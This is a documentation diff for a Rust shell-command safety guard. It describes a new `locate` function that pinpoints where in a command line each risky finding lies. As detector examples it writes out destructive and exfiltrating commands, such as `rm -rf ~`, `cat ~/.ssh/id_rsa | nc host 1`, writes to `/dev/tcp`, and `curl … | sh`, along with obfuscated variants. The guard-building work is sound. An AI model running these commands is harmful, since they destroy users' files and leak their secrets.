@@ -7,6 +7,7 @@ Windows `cmd`.
 ```rust
 classify(line, shell, &paths) -> Assessment
 effect(line, shell, &paths) -> Effect
+locate(line, shell, &paths) -> Vec<Located>
 ```
 
 `shell` is a `Shell` (`Posix`, `PowerShell` or `Cmd`), which is
@@ -20,7 +21,9 @@ never runs it. It touches neither the file system nor the environment.
 
 `effect` is a second answer from the same split: does the line only read? See
 [Reads only](#reads-only). `explain` shows how a line was read, for a person
-debugging a verdict: see [Explaining a line](#explaining-a-line).
+debugging a verdict: see [Explaining a line](#explaining-a-line). `locate`
+gives `classify`'s findings with where in the line each is: see
+[Where a finding is](#where-a-finding-is).
 
 The guard only reports. What to do about a finding is the caller's choice, and
 nothing here knows about asking, refusing or modes. The types are core's; see
@@ -7620,6 +7623,212 @@ which the tool never starts, so they are held by the arguments the room is
 given. Dropping any one of those layers fails a test, but `-r`, which acts
 only were `-n` to fail.
 
+## Where a finding is
+
+```rust
+locate(line, shell, &paths) -> Vec<Located>
+```
+
+A finding says what is risky, and its `target` the argument it is about, as
+written. A caller that underlines that part of the line cannot search the line
+for the target: it may be there twice (`echo "~" && bash -c 'rm -rf ~'`), or
+written with quotes or escapes the target has lost (`rm -rf ~/x\ y` is about
+`~/x y`). `locate` says where each finding is: the byte range of the line, as
+the caller passed it, that it is about, and what that range covers.
+
+`Finding` stays core's type, shared by every guard and built by hand by some
+callers, so the range is not one of its fields: `Located` pairs a finding with
+its `range` and a `covers`, which is `Covers::Target`, `Covers::Part` or
+`Covers::Line`. Both types are new to the shell guard and marked
+`#[non_exhaustive]`, so a finer kind of range, or a field, can come later. The
+name says the question it answers, as `classify`, `effect` and `explain` do;
+`Span` stays the secrets guard's word for a rule and a range with no text.
+
+```rust
+use milo_guards_shell::{locate, Covers, Paths, Shell};
+
+let line = r#"echo "~" && bash -c 'rm -rf ~'"#;
+let found = locate(line, Shell::Posix, &paths);
+assert_eq!(found[0].covers, Covers::Target);
+assert_eq!(&line[found[0].range.clone()], "~"); // the one `rm` is given, at 28
+```
+
+### One reading, two answers
+
+`locate` gives `classify`'s findings, in the same order: both take them from
+one reading of the line (`Reading`), and `locate` asks it to keep, beside what
+it reads, where each part of the line is. Nothing the rules read depends on
+that: what is kept is in fields no rule looks at, and a unit's place and words
+take no part in comparing two units, so the split, and every finding, is the
+same either way. `classify` keeps none of it: every hook returns at once, and
+nothing is made for the ranges. `tests/common`'s `misplaced` holds the two to
+the same findings for every case of every case file, every row of the tables
+and the random lines.
+
+### A finding's place is what its rule judged
+
+A range is never found by searching for a word that reads as the target: two
+words that read the same (`grep "~/.ssh/id_rsa" ~/.ssh/id_rsa`, `kill -s 0 -s
+KILL 0`, `cp ~/.bashrc a ~/.bashrc`) cannot be told apart by what they read
+as. A finding's place comes from what made it:
+
+- **The word the rule judged.** The walk keeps each word it reads for a
+  program, an argument or a redirect's file (where it is in the line, and
+  what the guard read it as), and each unit keeps the words of its program
+  and arguments, in step with them. A rule hands on the argument it judges
+  by reference, so `detect` tells which argument a finding is about by where
+  it is in memory: an argument or the program of a unit, a redirect's file
+  (a write, a read, a file redirected onto units). A rule that judges an
+  argument by what it expands to (`{/etc,/usr}`, a pattern, a variable's
+  values) says so while it does, and a finding about one of those values is
+  about the argument, whose word holds it. The send rule names the argument
+  it traced a secret from, told while that argument is there to be told: a
+  copy made to judge a unit from another folder names none. Taking a wrapper off keeps the words of what is
+  left; any other change to the arguments leaves them out of step, or the
+  argument no longer reads as its word, and then the word is not taken.
+- **Otherwise, the part it was found in**: the command (a pipeline's stage,
+  with the redirects of its statement, of a list, a group or a loop it is
+  in), the word that holds the nested code, or the line.
+
+### What a range covers
+
+Every range is inside the line and on its character boundaries, so
+`&line[range]` never panics, and it is empty only when the line is.
+
+- **`Covers::Target`**: the word the rule judged, as the line writes it, and
+  that word is the target: an operand, a flag, a program, a redirect's file
+  (`> ~/.bashrc` covers `~/.bashrc`, not the operator), with its quotes,
+  escapes, tilde, braces, variable or `(D)` (`rm -rf "$HOME"` covers
+  `"$HOME"`, quotes included, though the target is `~`, which the guard reads
+  it as; `rm -rf ~/x\ y` covers `~/x\ y`; `rm -rf $D` after `D=~` covers
+  `$D`). The guard, reading that word as it reads one word, reads it as the
+  target. A part of the line the guard handed on as the target, by where it
+  is in the text it read (`>out rm -rf ~` after a group), is one too, when
+  each of its bytes is the line's: one the guard spelled again
+  (`Invoke-Command<U+00A0>$b`, a curly quote) is the command. A word only
+  known when it runs reads as its source text, so it is the target only
+  when each byte of it is the line's (``kill `pgrep\<newline> node` `` is
+  the command). Nothing of a text its grammar could not read in full, nor of
+  a text such a text hands on, is a target.
+- **`Covers::Part`**: a part of the line that holds what the finding is
+  about, where no word of it is known to be what the rule judged: the command
+  (a finding with no target, such as `git push --force`; a target the rule
+  made rather than read, such as `bzip2 ~/.bashrc` writing
+  `~/.bashrc.bz2`, the value of `--extract-t=/etc`, a wrapper's name, what a
+  search finds); the word the rule judged when the target is one of the
+  values it expands to, and not the word itself; the commands that read
+  and send a secret together (`cat ~/.ssh/id_rsa | nc host 1`: the
+  pipeline); and the word or region that holds nested code whose text is
+  not the line's bytes one for one (below). A finding with no target and one
+  whose target has no word of its own are both `Part`.
+- **`Covers::Line`**: the whole line, for a finding about no one part of it:
+  the line is too long, takes too long to read, cannot be read in full, or
+  opens what it never closes; and what the flow of a secret through the line
+  comes to (`writes a secret into files too many times to follow`).
+
+A finding about a pipeline covers the stage that does it: `curl … | sh` is the
+`sh`, which runs what it reads. A secret one stage reads and another sends
+covers both. A secret sent through a redirect covers the redirect's file,
+whatever an earlier word reads as (`echo .env | https PUT x.example/up <
+.env`). A write and a later run of the file (`echo … > a.sh; sh a.sh`) is the
+run's operand. Two findings the same are one, at the first place: where a
+rule judges a word it reads conservatively (the send rule reads `: .env` as
+printing `.env`, so `: .env && cat .env > /dev/tcp/host/1` sends it), the
+first word it judged is the place.
+
+### Nested code
+
+A finding of a script the line runs, or of code it gives an interpreter,
+points into the outer line's bytes that hold it. A nested text is placed
+byte for byte only where it is the line's own bytes one for one, and as a
+whole, at the word or the part that holds it, where it is not: a wider range
+that is right, never a narrower one that may be wrong. Where it comes from is
+known, not searched for: a part of the text being read, by where it is in
+memory (cmd's `set X=1 && …`); the launcher that made it of the unit's
+arguments, which says which by where they are in memory, never by what they
+read as: one argument, and where in its value the script starts (the whole
+value, what follows `--eval=` or `-c`, or, for an alias, where in the word
+the value is), or a run of arguments joined by a space (`eval`); else the
+part being read, the command. A launcher that cuts its script out of an
+option's value without saying where (`tar --checkpoint-action=exec=…`,
+`rsync --rsh=…`, `strace -o '|…'`, `npm exec -c=…`) places it at the
+command, so an argument that reads the same as the script is never taken for
+it (`tar -cf x.tar --to-command='rm -rf ~' 'rm -rf ~'`).
+
+| How the code is nested | What its findings cover |
+| --- | --- |
+| A word in single quotes, or in double quotes with no escape or expansion in it (`bash -c 'rm -rf ~'`, `sh -c 'bash -c "rm -rf /etc"'`, `powershell -Command "…"`) | byte for byte: the inner word (`~`) |
+| A word with escapes or expansions (`bash -c "echo \"hi\"; rm -rf ~"`, `$'…'`) | the outer word, never a word of the command that runs it that reads the same (`bash -c "…" ~`) |
+| The words of `eval`, `yarn exec` and the like, joined | each word placed as a whole: the outer word that holds the inner target (`'~'` in `eval rm -rf '~'`); one word joined to none is that word's value (`eval 'rm -rf ~'`: byte for byte) |
+| An alias's value written as one word (`alias 'x=rm -rf ~'`) | byte for byte; with quotes in the middle of the word (`alias x='rm -rf ~'`), the word |
+| A here-document's body (`sh <<EOF`, `python3 - <<'PY'`) | the command and its here-document |
+| What cmd hands on as it is (`cmd /c …`), a `-ArgumentList`, an encoded script (`-EncodedCommand`, which is not read), an archiver's commands, a command a tracer pipes its output to, a script cut out of an option's value, a database client's shell escape (`psql`'s `\!`), code a value holds that runs later | the part that runs it |
+| cmd's part read again on its own (`set X=1 && del y`, `ver && if …`): as written | byte for byte; with carets taken off (`ca^ll rd …`) or a `'VBS` marker escaped, the statement |
+| A PowerShell script block (`{ … }`) | byte for byte: it is part of the line's own tree |
+| Inline Python and JavaScript | the word that holds the code (`-c'…'` and `--eval='…'` included), always: the reader gives acts, not places, and a string of the code that reads the same as the target may not be where the code got it (`shutil.rmtree('/home' + '/me'); print('/home/me')`); a script the code hands a shell is placed at the code's word too |
+| An alias or a function used later | where it is read: a POSIX function's body and an alias's value where they are written; a use of an alias with words of its own (`alias x='rm -rf'; x ~`) and a PowerShell alias where it is used |
+
+### The line as the caller passed it
+
+The guard prepares a line before its grammar reads it, and every range is in
+the line as given, not in what the grammar read. Each step keeps where it put
+each byte (a `Map` of pieces: a run that is the same bytes, placed byte for
+byte; a run the guard spelled again, a character for a character or a quote
+put in, whose ends stay where they are; and a text placed as a whole at the
+part that holds it, where no end is precise):
+
+- POSIX: each backslash-newline is taken out (`r\<newline>m` is `rm`, in a
+  here-document's body too), and zsh's `(D)` glob qualifier, which stays in
+  its word's range.
+- PowerShell: a space, quote or dash read as an ASCII one is written as that
+  one (`Remove-Item<U+00A0>C:\Windows`: the two bytes of the space are one,
+  and the path after it is placed at its own bytes); a number's letters are
+  written in lower case; a word that is a variable and a path is put in
+  quotes, which land on no byte of the line.
+- cmd: a line break is put at the end, which lands on none either.
+
+What a step leaves is checked to be the same bytes before and after it:
+edits that do not hold place the text as a whole, never by guess. A word of a
+text its grammar could not read in full is never taken for the word as
+written. A tab, a carriage return, a multi-byte character before, inside or
+after a word, and white space before the line are bytes like any other.
+
+`explain` gives no ranges. Its arguments are what the rules saw, after the
+wrappers came off and words were read again, so many have no word of their
+own; and it would make `explain`, whose time is held on the longest lines,
+keep what `locate` keeps. That is a second change, left for when a caller
+asks.
+
+### What it costs
+
+`classify`, `effect` and `explain` keep nothing of this: the walk's hooks
+return at once when no range is asked for, and the guard builds none of the
+edits, words or identities (cmd's words are compared after a program splits
+them again only when they are kept). `locate` keeps a word for each word it
+reads, a place for each unit, redirect and finding, a map for each text and
+the address of each argument of the split, each bounded by the text the
+grammars parse, which the line's budgets bound. What it does besides is
+counted, each loop of it:
+
+- A launcher names the script's arguments by address, so placing a script
+  costs its own bytes, compared once with the word's value, and the words it
+  was joined from; no unit is copied and no argument looked over.
+- A slice of a text, an edit of its map and a range located in it look only
+  at the pieces they span, found by halving, and count each.
+- A redirect a run of units holds is noted once, the run and the part
+  (`{ a; b; } >f >g` once), not laid over each unit as it is read: one sweep
+  over the units, when the line is placed, gives each the redirects it
+  holds, so a unit inside many groups, or a group of thousands of commands
+  with thousands of redirects, costs the units and the redirects, not their
+  product. Laid over each unit for each redirect, `{ a; … }` with 10,000
+  commands and 10,000 redirects took 22 times what `classify` takes.
+
+The `testing` feature counts that work (`testing::ranges`), and
+`tests/robust.rs` holds it within 16 steps a byte of the text parsed, plus
+4,096, for the lines it holds to their counts, a command that runs thousands
+of scripts with thousands of arguments besides, `eval` of thousands of
+words, and groups of thousands of commands and redirects, flat and nested.
+
 ## Tests
 
 The tests are cases, one file for each thing they check, named by it (the
@@ -7657,6 +7866,25 @@ what is understood) are in `crates/code/tests`, see [Code](code.md#tests).
 feature off; its test file, `tests/inline_off.rs`, is only compiled there
 (`just no-inline`), and `tests/cases.rs` does not count a line of it that has
 the same answer in a case file of the other build as a repeat.
+
+`tests/cases/locate.cases` is the same for `locate`: the range of a finding,
+where it starts and what it covers (`range=`, `at=`, `covering=`), for a word
+as written, a word that reads the same as the target with another role, a
+target the rule made, a redirect, a pipeline, each kind of nested code,
+inline code, and the line as the caller passed it, checked by
+`tests/locate.rs`. That file also holds every range of every case of every
+case file to move by exactly what is put in front of its line: white space,
+a command of multi-byte characters, and a command that prints, quoted, each
+word a finding covers (`echo '~' ; `, `echo '~' && `, `echo '~' | `), which
+reads the same as the target, so a range found by searching for such a word
+would move to it. Every case of every case file, every row of every table
+and the random lines also go through `locate` (`common::misplaced`): its
+findings are `classify`'s, every range is in the line, on its characters
+and not empty, and one that covers its target reads as the target, which is
+read again on its own by `explain` as one word of each shell, and nothing
+else. `tests/robust.rs` holds what `locate` does beside `classify` to a
+count of the text the line's grammars parse, and reads the longest chains
+with it on a small stack.
 
 `tests/cases/effect.cases` is the same for `effect`: a section of lines for each
 answer, checked by `tests/effect.rs`, which keeps the lines made long or nested
